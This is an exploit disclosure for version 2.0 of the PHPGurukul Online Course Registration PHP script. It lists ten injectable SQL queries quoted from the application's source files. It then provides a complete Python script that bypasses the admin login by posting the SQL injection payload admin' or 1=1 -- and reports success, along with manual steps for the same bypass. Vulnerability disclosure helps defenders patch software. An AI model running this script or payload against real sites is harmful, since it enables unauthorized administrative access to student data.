# Exploit Author: Daniel Monz√≥n (stark0de)
# Vendor Homepage: https://phpgurukul.com
# Software Link: https://phpgurukul.com/online-course-registration-free-download/
# Version: 2.0
# Tested on: Kali Linux x64 5.4.0
# CVE : N/A

#There are multiple SQL injection vulnerabilities in Online Course Registration #PHP script:

#./check_availability.php:               $result =mysqli_query($con,"SELECT studentRegno FROM    courseenrolls WHERE course=&#039;$cid&#039; and studentRegno=&#039; $regid&#039;");
#./check_availability.php:               $result =mysqli_query($con,"SELECT * FROM courseenrolls WHERE course=&#039;$cid&#039;");
#./check_availability.php:               $result1 =mysqli_query($con,"SELECT noofSeats FROM course WHERE id=&#039;$cid&#039;");
#./change-password.php:$sql=mysqli_query($con,"SELECT password FROM  students where password=&#039;".md5($_POST[&#039;cpass&#039;])."&#039; && studentRegno=&#039;".$_SESSION[&#039;login&#039;]."&#039;");
#./admin/check_availability.php:         $result =mysqli_query($con,"SELECT StudentRegno FROM students WHERE StudentRegno=&#039;$regno&#039;");
#./admin/change-password.php:$sql=mysqli_query($con,"SELECT password FROM  admin where password=&#039;".md5($_POST[&#039;cpass&#039;])."&#039; && username=&#039;".$_SESSION[&#039;alogin&#039;]."&#039;");
#./admin/index.php:$query=mysqli_query($con,"SELECT * FROM admin WHERE username=&#039;$username&#039; and password=&#039;$password&#039;");
#./index.php:$query=mysqli_query($con,"SELECT * FROM students WHERE StudentRegno=&#039;$regno&#039; and password=&#039;$password&#039;");
#./includes/header.php:        $ret=mysqli_query($con,"SELECT  * from userlog where studentRegno=&#039;".$_SESSION[&#039;login&#039;]."&#039; order by id desc limit 1,1");
#./pincode-verification.php:$sql=mysqli_query($con,"SELECT * FROM  students where pincode=&#039;".trim($_POST[&#039;pincode&#039;])."&#039; && StudentRegno=&#039;".$_SESSION[&#039;login&#039;]."&#039;");

#It is also possible to bypass the authentication in the two login pages:
#!/usr/bin/python3
try:
   from termcolor import colored 
   from colorama import init
   import argparse
   import requests
except:
	print("Please run pip3 install termcolor,colorama,argparse,requests")

init()

symbol_green=colored("[+]", &#039;green&#039;) 
symbol_red=colored("[-]", &#039;red&#039;) 

parser = argparse.ArgumentParser()
parser.add_argument(&#039;url&#039;, help=&#039;The URL of the target.&#039;)
args = parser.parse_args()

adminurl = args.url + &#039;/onlinecourse/admin/&#039;



def main():
    initial=&#039;Online Course Registration Authentication Bypass in %s&#039; % ( args.url ) + "\n"
    print(colored(initial, &#039;yellow&#039;))
    sess = requests.session()
    data_login = {
    &#039;username&#039;: "admin&#039; or 1=1 -- ",
    &#039;password&#039;: &#039;whatever&#039;,
    &#039;submit&#039;: &#039;&#039;
}
    try:
        req = sess.post(adminurl, data=data_login, verify=False, allow_redirects=True)
        resp_code = req.status_code
    except:
    	print(symbol_red+" The request didn&#039;t work!\n")
    	exit()
    if resp_code == 200 and "document.chngpwd.cpass.value" in req.text:
       print(symbol_green+" Authentication bypassed for admin user!\n")
       print(symbol_green+" To test this manually, visit: " + adminurl+ " and enter: admin&#039; or 1=1 -- in the username field and whatever in password field, then click the Log Me In button\n")

    else:
       print(symbol_red+" Fail!")

main()

